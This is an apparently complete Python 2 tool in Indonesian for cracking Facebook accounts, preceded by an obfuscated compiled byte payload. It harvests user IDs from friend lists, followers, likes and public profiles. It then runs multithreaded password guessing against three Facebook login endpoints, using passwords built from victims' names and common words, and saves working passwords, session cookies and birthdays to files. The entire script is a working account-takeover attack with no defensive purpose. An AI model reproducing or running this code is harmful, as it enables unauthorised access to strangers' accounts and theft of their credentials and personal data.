\xa4^d:\xaeF$\xa4oQ\x9e\xf0:\xa0*\x8be\xe5\xbb\x84\xa4\x81[k\x1d\xdcWiQ\xcc\xed\xce_2\x08\xa2u\x8a\x1f\xa3\xd8\xc0\xdd\xdbK3q\xc04\x1044\x9c\xd7x\x1d\xe7\x96:6\x97\xf1vwb\xec9\x16\xff\xd3\x1b\xcc\x90\xed\x06\x9c\xc4\x94\xa1\xf5\xa5\xb6\x0fn\xe4\x19k \x92\xc1[\xf4 \xf2\xd6\xb5\x9e\xbey\xbdLZ\xf7\xe6+\x9f\x86,/\xc3\x19\xf0W\xeb\x8e}\x8e\xa0\xb7w\xac\xb5"\\K\xee\x16~\xad\x12\xbc\x12p[\xac\x928*\xd5\xb8\xea\xa8zKUH\xe5x\xbf\x98\x0c\x17\xc0XA_\x1a\x85d\xb8\xbcO{!\x90\xdaT\xfd\xa5\xef\x88\xd0\xa9\x08\x9f\xc9`\x0bo!\x8a!t\x19\xe79\xf0\x0cF\n\x98Zz\xe5\x12\'s\x07\xa3\r\xa6f\x90\xe8[G\nh\x9a\xdf\x8a\x0f}-\t\xda\x13@\xa3U\x90\x01\x87\xa7(\x02\xc7Hq\xcdO\x80\x94;\x19\xfc\xc0\x98j\x9d\xb9o\xed\\J;\xbd\xbe\x9d\x92I\xbe\x14\xc3\x0f\xcf\xc8\xf9\xf2\xca6\xa3,\x90\xd1\x8d~L\xf1DT\xae\x14\xd3\xf5w\x04\x80\xf5\xab\n\xad\xfc\xe3\xe6\rz\xe0P\x1c\xc0\xb7\x87\x19\x1a\x1e;}K\x93\xc5{\xe5\xb8N\xc5,gm2Lov\xf1\xb8\x05V\xb4VSEz\x8a\x8a\xe4\x89\x0c\x93\x7f\r\x90\xbe\x83\xa9\x0b\x1a\x06\x8f70\x06S\x07\xa7\xc3(\x1c\xc6Kby\xe5\x08\x8cW\xeftn{\xff\x9a\x03\'\x8a\xef\xe4\'\xd7\xa2\x15\xa8\xd1\x1d\xb7\x0bK,D\xf2R\x01\x99a\xcf\x89\xdd\xd8\xe8^o\xaa\t9\x1d\x05.\x93\xc1A\xd3\xbb\x0e;\xb8\xfb\xcb\xd8\xae\x92\xb9\xbc\xb5\x9f\x90H\x0enI\x12M\x9e\xf1\x84\xcb7\x9f\xd2\x1c\xafoS\xd1\xba\x08cj\xcf\xd1tU\x82\xca\x0b\x96U\x9a\xd2()\xdf\xbfT\xc1\xe3m\xf6\x0c\xe1<\x85\x08\xab\x1f\xef\x02!P\xfc\x99\nZ\xf9G\x10F[Y\xcb*\x04X\xe2V\x11\xb5\x98*\xe7\xdf\t0\xb4\xf2H1\xa9\x89\xf5\xb4o\xd3U\xde\x19\xba?\xd1\x13\xe6 \'\xb1\xbfx@\'\x01}\xa5\x166\x9f\xad\xf3\xf6\xfbN\xaem\x1f/a\xf2^Y\xbc\x01\xa9/\xc0F_\x7fro\xe2\x0e\xec3\x8ch\xaf\xabLo\xc3=\x98\xe0\x94\xd19\xe0\xe7A\xef\xd1K\xf2\tpXV+,\\\x10\xf3"\xfb0\xb8\xae\xee\xdb\xa0dRw%\xef\n\x86P\xc0~DI\xde\xdd,\x02~\xfb\x17\xa7\xca\x01\x15O \xdb\xcar\x8ft\x08v\x83\xe2\x00Bd\xc0VB:&\xb7B\xdf\xf2\x8a\xfd\xf13I4\xbc\xff\x07\xc6\\>\xb9\x0eE\xdd(\x9f\xca\x04?\x1d`*)\xff\x04\xa0\x91\xe9|\xf5\x935\x04\x16c6,\xeft\xfd\xa1\xe6\xb5kFY\xba\xe5\x1d\x05\xc8GH\xa5\xa5"m\xaa\xf3+\x86\xa81W\xf0\xfa&\xce\x1f\xa2l\x1d\xf1!\xa8:"\xbd\xf5_f\xc8XA\xfe\xd5\xc2\xfb\xb97\x8f\xa6\xaa\x8b\xf3\xcb\x93\xb3fr\xf2\x7f\x01\xad8\xb6\x13',compile))
 
mfb_h={'Host': 'm.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent':ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
##### CLEAR #####
def clear():
	if " linux" in sys.platform.lower():
		os.system("clear")
	elif "win" in sys.platform.lower():
		os.system("cls")
	else:os.system("clear")
##### KELUAR #####
def keluar():
    print ( ' *! Keluar')
    os.sys.exit()
##### JALAN #####
def jalan(z):
        for e in z + '\n':
                sys.stdout.write(e)
                sys.stdout.flush()
                time.sleep(0.03)
##### LOGIN #####
def login():
    os.system('clear')
    print logo
    print "\n *! Ketik *T* Jika Login Menggunakan Token"
    print " *! Ketik *C* Jika Login Menggunakan Cookie"
    lg = raw_input('\n *-> Input : ')
    if lg == '':
        os.sys.exit()
    elif lg == 'T' or lg == 't':
        toket = raw_input(" *-> Token : ") # Login Token
        try:
                otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
                a = json.loads(otw.text)
                nama = a['name']
                zedd = open("login.txt", 'w')
                zedd.write(toket)
                zedd.close()
                komen()
        except KeyError:
                print (" *! Token Salah")
                time.sleep(1.7)
                login()
        except requests.exceptions.SSLError:
                print (" *! Tidak Ada Koneksi")
                exit()
    elif lg == 'C' or lg == 'c':
        try:
		cookie = raw_input(" *-> Cookie : ")
                data = {
                            'user-agent' : 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36', # don't change this user agent.
                                'referer' : 'https://m.facebook.com/',
                                'host' : 'm.facebook.com',
                                'origin' : 'https://m.facebook.com',
                                'upgrade-insecure-requests' : '1',
                                'accept-language' : 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
                                'cache-control' : 'max-age=0',
                                'accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                                'content-type' : 'text/html; charset=utf-8',
                                 'cookie' : cookie }
                coki = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers = data)
                cari = re.search('(EAAA\w+)', coki.text)
                hasil = cari.group(1)
                pup = open('coki.log', 'w')
                pup.write(cookie)
                pup.close()
                pip = open('login.txt', 'w')
                pip.write(hasil)
                pip.close()
                komen()
        except AttributeError:
                print ' *! Cookie Salah'
                time.sleep(3)
                login()
        except UnboundLocalError:
                print ' *! Cookie Salah'
                time.sleep(3)
                login()
        except requests.exceptions.SSLError:
                print ' *! Tidak Ada Koneksi'
                exit()
    elif lg == '0' or lg == '00':
        os.sys.exit()
    else:
        exit(' *! Isi Dengan Benar')
##### MENU #####
def menu():
  try:
    toket = open('login.txt','r').read()
    otw = requests.get('https://graph.facebook.com/me/?access_token='+toket)
    a = json.loads(otw.text)
    nm = a['name']
    id = a['id']
    tl = a['birthday'].replace("/","-")
  except Exception as e:
    print (' *! Token Invalid')
    time.sleep(1)
    login()
  except KeyError:
    print (' *! Token Invalid')
    time.sleep(1)
    os.system('rm -rf login.txt')
    login()
  except requests.exceptions.ConnectionError:
    print (' *! Tidak Ada koneksi')
    os.sys.exit()
  except Exception as e:
    print (' *! Token Invalid')
    time.sleep(1)
    login()
  os.system("clear")
  print logo
  print ('\n *•> Nama : '+nm)
  print (' *•> Akun ID : '+id)
  print (' *•> Tanggal Lahir : '+tl)

  print ('\n *1 Crack ID Dari Teman')
  print (' *2 Crack ID Dari Publik')
  print (' *3 Crack ID Dari Followers')
  print (' *4 Crack ID Dari Like')
  print (' *5 Lihat Hasil Crack')
  print (' *0 Keluar (Hapus Token/Cookies)\n')
  mn=raw_input(" *-> Input : ")
  if mn=="":
	print (' *! Isi Dengan Benar')
	menu()
  elif mn=="1":
    teman()
  elif mn=="2":
    publik()
  elif mn=="3":
    followers()
  elif mn=="4":
    like()
  elif mn=="5":
    print ('\n *1 Lihat Hasil Ok')
    print (' *2 Lihat Hasil Cp')
    print (' *0 Kembali\n')
    hs = raw_input(' *-> Input : ')
    if hs == '':
        menu()
    elif hs == '1' or hs == '01':
	ok()
    elif hs == '2' or hs == '02':
	cp()
    else:
	exit(' *! Isi Dengan Benar')
  elif mn=="0":
    try:
      os.remove("login.txt")
      print (' *! Berhasil Menghapus Token/Cookies')
      os.sys.exit()
    except Exception as e:
	print (' *! File Tidak Ada')
	os.sys.exit()
  else:
    print (' *! Isi Dengan Benar')
    menu()
def ok():
	try:
		ok=open('Ok.txt','r').read()
		print ' '
		print ok
	except KeyError,IOError:
                print (' *! Hasil Ok Tidak Ada')
		os.sys.exit()
	except Exception as e:
	        print (' *! Hasil Ok Tidak Ada')
	        os.sys.exit()
def cp():
        try:
                cp=open('Cp.txt','r').read()
		print ' '
                print cp
        except KeyError,IOError:
                print (' *! Hasil Cp Tidak Ada')
                os.sys.exit()
	except Exception as e:
        	print (' *! Hasil Cp Tidak Ada')
	        os.sys.exit()
##### CRACK TEMAN #####
def teman():
        try:
                toket=open('login.txt','r').read()
        except IOError:
		print (' *! Token Invalid')
                os.system('rm -rf login.txt')
                time.sleep(0.01)
                login()
        try:
		limit = '5000'
                file = 'dump.txt'
                try:
                   r=requests.get("https://graph.facebook.com/me/friends?access_token="+toket+"&limit="+limit)
                except KeyError:
			print (' *! Tidak Ada Teman')
			raw_input(" *Kembali")
                        menu()
                id = []
                z=json.loads(r.text)
                qq = ('teman.txt').replace(" ","_")
                ys = open(qq , 'w')#.replace(" ","_")
                for a in z['data']:
                        id.append(a['id']+"<=>"+a['name'])
                        ys.write(a['id']+"<=>"+a['name']+'\n')
                        print("\r *-> Mengumpukan  %s ID\r"%(str(len(id)))),;sys.stdout.flush();time.sleep(0.007)
                ys.close()
                os.rename(qq,file)
		print " "
		print("\r *-> Total ID : %s         "%(len(id)))
                metode()

        except requests.exceptions.ConnectionError:
		print (' *! Tidak Ada Koneksi')
		os.sys.exit()
##### CRACK FOLLOWERS #####
def followers():
        try:
                toket=open('login.txt','r').read()
        except IOError:
		print (' *! Token Invalid')
                os.system('rm -rf login.txt')
                time.sleep(0.01)
                loginn()
        try:
                idt = raw_input("\n *-> Profil ID : ")
                limit = '5000'
                file = 'dump.txt'
                try:
                        jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
                        op = json.loads(jok.text)
                        print(" *-> Nama : "+op["name"])
                except KeyError:
			print (' *! ID Tidak Ditemukan')
			raw_input(" *Kembali")
			menu()
                r=requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+toket+"&limit="+limit)
                id = []
                z=json.loads(r.text)
                qq = ('flw.txt').replace(" ","_")
                ys = open(qq , 'w')#.replace(" ","_")
                for a in z['data']:
                        id.append(a['id']+"<=>"+a['name'])
                        ys.write(a['id']+"<=>"+a['name']+'\n')
                        print("\r *-> Mengumpukan %s ID\r"%(str(len(id)))),;sys.stdout.flush();time.sleep(0.007)
                ys.close()
                os.rename(qq,file)
                print("\r *-> Total ID : %s           "%(len(id)))
                metode()

        except KeyError:
		print(' *! Tidak Ada Followers')
                raw_input(' *Kembali')
                menu()
        except requests.exceptions.ConnectionError:
		print(' *! Tidak Ada Koneksi')
		os.sys.exit()
##### CRACK LIKE #####
def like():
        try:
                toket=open('login.txt','r').read()
        except IOError:
		print(' *! Token Invalid')
                os.system('rm -rf login.txt')
                time.sleep(0.01)
                loginn()
        try:
                idt = raw_input("\n *-> Post ID : ")
		limit = '5000'
                file = 'dump.txt'
                try:
                   r=requests.get("https://graph.facebook.com/"+idt+"/likes?limit="+limit+"&access_token="+toket)
                except KeyError:
			print (' *! Post ID Tidak Ada')
			raw_input(" *Kembali")
                        menu()
                id = []
                z=json.loads(r.text)
                qq = ('likess.txt').replace(" ","_")
                ys = open(qq , 'w')#.replace(" ","_")
                for a in z['data']:
                        id.append(a['id']+"<=>"+a['name'])
                        ys.write(a['id']+"<=>"+a['name']+'\n')
                        print("\r *-> Mengumpulkan %s ID \r"%(str(len(id)))),;sys.stdout.flush();time.sleep(0.007)
                ys.close()
                os.rename(qq,file)
                print("\r *-> Total ID : %s           "%(len(id)))
		metode()

        except KeyError:
		print (' *! Harus Berupa ID Postingan')
                raw_input(' *Kembali')
                menu()
        except requests.exceptions.ConnectionError:
		print (' *! Tidak Ada Koneksi')
		os.sys.exit()
##### CRACK PUBLIK #####
def publik():
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print (' *! Token Invalid')
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		loginn()
	try:
		idt = raw_input("\n *-> Profil ID : ")
		limit = '5000'
		file = 'dump.txt'
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print(" *-> Nama : "+op["name"])
		except KeyError:
			print(' *! Profil ID Tidak Ada')
			raw_input(" *Kembali")
			menu
		r=requests.get("https://graph.facebook.com/"+idt+"?fields=friends.limit("+limit+")&access_token="+toket)
		id = []
		z=json.loads(r.text)
		qq = ('pblk.txt').replace(" ","_")
		ys = open(qq , 'w')#.replace(" ","_")
		for a in z['friends']['data']:
			id.append(a['id']+"<=>"+a['name'])
			ys.write(a['id']+"<=>"+a['name']+'\n')
			print("\r *-> Mengumpulkan %s ID"%(str(len(id)))),;sys.stdout.flush();time.sleep(0.007)
		ys.close()
		os.rename(qq,file)
		print("\r *-> Total ID : %s          "%(len(id)))
		metode()
		
	except Exception as e:
		print(' *! Tidak Ada Teman')
		menu()
	except requests.exceptions.ConnectionError:
                print (' *! Tidak Ada Koneksi')
                os.sys.exit()
def mbasic(em,pas,hosts):
	global ua,mbasic_h
	r=requests.Session()
	r.headers.update(mbasic_h)
	p=r.get("https://mbasic.facebook.com/")
	b=bs4.BeautifulSoup(p.text,"html.parser")
	meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
	data={}
	for i in b("input"):
		if i.get("value") is None:
			if i.get("name")=="email":
				data.update({"email":em})
			elif i.get("name")=="pass":
				data.update({"pass":pas})
			else:
				data.update({i.get("name"):""})
		else:
			data.update({i.get("name"):i.get("value")})
	data.update(
		{"fb_dtsg":meta,"m_sess":"","__user":"0",
		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
		}
	)
	r.headers.update({"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8"})
	po=r.post("https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
	if "c_user" in r.cookies.get_dict().keys():
		return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	elif "checkpoint" in r.cookies.get_dict().keys():
		return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	else:return {"status":"error","email":em,"pass":pas}#crack mbasic
def mfb(em,pas,hosts):
    global ua,mfb_h
    r = requests.Session()
    r.headers.update(mfb_h)
    p = r.get('https://m.facebook.com/')
    b = bs4.BeautifulSoup(p.text, 'html.parser')
    dtg = ('').join(bs4.re.findall('dtsg":\\{"token":"(.*?)"', p.text))
    data = {}
    for i in b('input'):
        if i.get('value') is None:
            if i.get('name') == 'email':
                data.update({'email': em})
            elif i.get('name') == 'pass':
                data.update({'pass': pas})
            else:
                data.update({i.get('name'): ''})
        else:
            data.update({i.get('name'): i.get('value')})

    data.update({'fb_dtsg': dtg, 'm_sess': '', '__user': '0', '__req': 'd', 
       '__csr': '', '__a': '', '__dyn': '', 'encpass': ''})
    r.headers.update({'referer': 'https://m.facebook.com/login/?next&ref=dbl&fl&refid=8'})
    po = r.post('https://m.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100', data=data).text
    if 'c_user' in r.cookies.get_dict().keys():
        return {'status': 'success', 'email': em, 'pass': pas, 'cookies': r.cookies.get_dict()}
    else:
        if 'checkpoint' in r.cookies.get_dict().keys():
            return {'status': 'cp', 'email': em, 'pass': pas, 'cookies': r.cookies.get_dict()}
        else:
            return {'status': 'error', 'email': em, 'pass': pas}

        return
def free(em,pas,hosts):
	global ua,free_h
	r=requests.Session()
	r.headers.update(free_h)
	p=r.get("https://free.facebook.com/")
	b=bs4.BeautifulSoup(p.text,"html.parser")
	meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
	data={}
	for i in b("input"):
		if i.get("value") is None:
			if i.get("name")=="email":
				data.update({"email":em})
			elif i.get("name")=="pass":
				data.update({"pass":pas})
			else:
				data.update({i.get("name"):""})
		else:
			data.update({i.get("name"):i.get("value")})
	data.update(
		{"fb_dtsg":meta,"m_sess":"","__user":"0",
		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
		}
	)
	r.headers.update({"referer":"https://free.facebook.com/login/?next&ref=dbl&fl&refid=8"})
	po=r.post("https://free.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
	if "c_user" in list(r.cookies.get_dict().keys()):
		return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	elif "checkpoint" in list(r.cookies.get_dict().keys()):
		return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	else:return {"status":"error","email":em,"pass":pas}
def metode():
    print ('\n *1 Metode Login mbasic.facebook')
    print (' *2 Metode Login m.facebook')
    print (' *3 Metode Login free.facebook')
    md = raw_input(' *-> Input : ')
    if md == '':
        os.sys.exit()
    elif md == '1' or md == '01':
	crack()
    elif md == '2' or md == '02':
	crack1()
    elif md == '3' or md == '03':
	crack2()
    else:
        exit(' *! Isi Dengan Benar')
def generate(text):
	results=[]
	global ips
	for i in text.split(" "):
		if len(i)<3:
			continue
		else:
			i=i.lower()
			if len(i)==3 or len(i)==4 or len(i)==5:
				results.append(i+"123")
				results.append(i+"12345")
				results.append(i+"1234")
			else:
				results.append(i+"123")
				results.append(i+"1234")
				results.append(i+"12345")
				results.append(i)
				if "indonesia" in ips:
					results.append("bangsat")
					results.append("cintaku")
					results.append("indonesia")
					results.append("sayang")
	return results
class crack:
	def __init__(self):
		self.ada=[]
		self.cp=[]
		self.ko=0
		while True:
			f=raw_input("\n *-> Password Auto/Manual (a/m) : ")
			if f=="":continue
			elif f=="m":
				try:
					while True:
						try:
							self.apk= 'dump.txt'
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(' *! File Tidak Ada')
							menu()
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print(' *! File Tidak Ada')
					continue
				print(' *•> Contoh Password : sayang,anjing')
				self.pwlist()
				break
			elif f=="a":
				try:
					while True:
						try:
							self.apk= 'dump.txt'
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(' *! File Tidak Ada')
							menu()
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print(' *! File Tidak Valid')
					menu()
					continue
				print(' *•> Aktifkan Mode Pesawat 5 Detik Jika Tidak Ada Hasil')
				print('\n *--> Hasil Ok Tersimpan Di Ok.txt')
				print(' *--> Hasil Cp Tersimpan Di Cp.txt\n')
				ThreadPool(35).map(self.main,self.fl)
				os.remove(self.apk)
				print ('\n*Selesai*')
				break
	def pwlist(self):
		self.pw=raw_input(" *-> Password : ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
			print('\n *•> Aktifkan Mode Pesawat 5 Detik Jika Tidak Ada Hasil')
                        print('\n *--> Hasil Ok Tersimpan Di Ok.txt')
                        print(' *--> Hasil Cp Tersimpan Di Cp.txt\n')
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			print ('\n*Selesai*')
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=mbasic(fl.get("id"),
					i,"https://mbasic.facebook.com")
				if log.get("status")=="success":
					print("\r\033[0;92m *---> "+(fl.get("id")+"\033[0;97m | \033[0;92m"+i+"	         "))
					self.ada.append("%s | %s"%(fl.get("id"),i))
					if fl.get("id") in open("Ok.txt").read():
						break
					else:
						open("Ok.txt","a+").write(
						"%s | %s | %s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies"))))
					ko="%s | %s | %s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies")))
					break
				elif log.get("status")=="cp":
					try:
						toket=open('login.txt','r').read()
						q=requests.get("https://graph.facebook.com/"+fl.get("id")+"?access_token="+toket)
						w=json.loads(q.text)
						tl=w["birthday"].replace("/","-")

					except (KeyError, IOError):
		                         tl = " "
					except:pass
					print("\r\033[0;93m *---> "+(fl.get("id")+" \033[0;97m|\033[0;93m "+i+"\033[0;93m "+tl+"          "))
					self.cp.append("%s | %s %s"%(fl.get("id"),i,tl))
					open("Cp.txt","a+").write(
						"%s | %s %s\n"%(fl.get("id"),i,tl))
					break
				else:continue
					
			self.ko+=1
			print "\r *Crack %s/%s *Ok : %s - *Cp : %s"%(self.ko,len(self.fl),len(self.ada),len(self.cp)),;sys.stdout.flush()
		except:
			self.main(fl)
class crack1:
	def __init__(self):
		self.ada=[]
		self.cp=[]
		self.ko=0
		while True:
			f=raw_input("\n *-> Password Auto/Manual (a/m) : ")
			if f=="":continue
			elif f=="m":
				try:
					while True:
						try:
							self.apk= 'dump.txt'
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(' *! File Tidak Ada')
							menu()
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print(' *! File Tidak Ada')
					continue
				print(' *•> Contoh Password : sayang,anjing')
				self.pwlist()
				break
			elif f=="a":
				try:
					while True:
						try:
							self.apk= 'dump.txt'
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(' *! File Tidak Ada')
							menu()
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print(' *! File Tidak Valid')
					menu()
					continue
				print(' *•> Aktifkan Mode Pesawat 5 Detik Jika Tidak Ada Hasil')
				print('\n *--> Hasil Ok Tersimpan Di Ok.txt')
				print(' *--> Hasil Cp Tersimpan Di Cp.txt\n')
				ThreadPool(35).map(self.main,self.fl)
				os.remove(self.apk)
				print ('\n*Selesai*')
				break
	def pwlist(self):
		self.pw=raw_input(" *-> Password : ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
			print('\n *•> Aktifkan Mode Pesawat 5 Detik Jika Tidak Ada Hasil')
                        print('\n *--> Hasil Ok Tersimpan Di Ok.txt')
                        print(' *--> Hasil Cp Tersimpan Di Cp.txt\n')
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			print ('\n*Selesai*')
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log = mfb(fl.get('id'), i, 'https://m.facebook.com')
				if log.get("status")=="success":
					print("\r\033[0;92m *---> "+(fl.get("id")+"\033[0;97m | \033[0;92m"+i+"	         "))
					self.ada.append("%s | %s"%(fl.get("id"),i))
					if fl.get("id") in open("Ok.txt").read():
						break
					else:
						open("Ok.txt","a+").write(
						"%s | %s | %s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies"))))
					ko="%s | %s | %s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies")))
					break
				elif log.get("status")=="cp":
					try:
						toket=open('login.txt','r').read()
						q=requests.get("https://graph.facebook.com/"+fl.get("id")+"?access_token="+toket)
						w=json.loads(q.text)
						tl=w["birthday"].replace("/","-")

					except (KeyError, IOError):
		                         tl = " "
					except:pass
					print("\r\033[0;93m *---> "+(fl.get("id")+" \033[0;97m|\033[0;93m "+i+"\033[0;93m "+tl+"          "))
					self.cp.append("%s | %s %s"%(fl.get("id"),i,tl))
					open("Cp.txt","a+").write(
						"%s | %s %s\n"%(fl.get("id"),i,tl))
					break
				else:continue
					
			self.ko+=1
			print "\r *Crack %s/%s *Ok : %s - *Cp : %s"%(self.ko,len(self.fl),len(self.ada),len(self.cp)),;sys.stdout.flush()
		except:
			self.main(fl)
class crack2:
	def __init__(self):
		self.ada=[]
		self.cp=[]
		self.ko=0
		while True:
			f=raw_input("\n *-> Password Auto/Manual (a/m) : ")
			if f=="":continue
			elif f=="m":
				try:
					while True:
						try:
							self.apk= 'dump.txt'
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(' *! File Tidak Ada')
							menu()
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print(' *! File Tidak Ada')
					continue
				print(' *•> Contoh Password : sayang,anjing')
				self.pwlist()
				break
			elif f=="a":
				try:
					while True:
						try:
							self.apk= 'dump.txt'
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(' *! File Tidak Ada')
							menu()
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print(' *! File Tidak Valid')
					menu()
					continue
				print(' *•> Aktifkan Mode Pesawat 5 Detik Jika Tidak Ada Hasil')
				print('\n *--> Hasil Ok Tersimpan Di Ok.txt')
				print(' *--> Hasil Cp Tersimpan Di Cp.txt\n')
				ThreadPool(35).map(self.main,self.fl)
				os.remove(self.apk)
				print ('\n*Selesai*')
				break
	def pwlist(self):
		self.pw=raw_input(" *-> Password : ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
			print('\n *•> Aktifkan Mode Pesawat 5 Detik Jika Tidak Ada Hasil')
                        print('\n *--> Hasil Ok Tersimpan Di Ok.txt')
                        print(' *--> Hasil Cp Tersimpan Di Cp.txt\n')
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			print ('\n*Selesai*')
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=free(fl.get("id"),
					i,"https://free.facebook.com")
				if log.get("status")=="success":
					print("\r\033[0;92m *---> "+(fl.get("id")+"\033[0;97m | \033[0;92m"+i+"          "))
					self.ada.append("%s | %s"%(fl.get("id"),i))
					if fl.get("id") in open("Ok.txt").read():
						break
					else:
						open("Ok.txt","a+").write(
						"%s | %s | %s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies"))))
					ko="%s | %s | %s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies")))
					break
				elif log.get("status")=="cp":
					try:
						toket=open('login.txt','r').read()
						q=requests.get("https://graph.facebook.com/"+fl.get("id")+"?access_token="+toket)
						w=json.loads(q.text)
						tl=w["birthday"].replace("/","-")

					except (KeyError, IOError):
		                         tl = " "
					except:pass
					print("\r\033[0;93m *---> "+(fl.get("id")+" \033[0;97m|\033[0;93m "+i+"\033[0;93m "+tl+"          "))
					self.cp.append("%s | %s %s"%(fl.get("id"),i,tl))
					open("Cp.txt","a+").write(
						"%s | %s %s\n"%(fl.get("id"),i,tl))
					break
				else:continue
					
			self.ko+=1
			print "\r *Crack %s/%s *Ok : %s - *Cp : %s"%(self.ko,len(self.fl),len(self.ada),len(self.cp)),;sys.stdout.flush()
		except:
			self.main(fl)

if __name__=='__main__':
	menu()
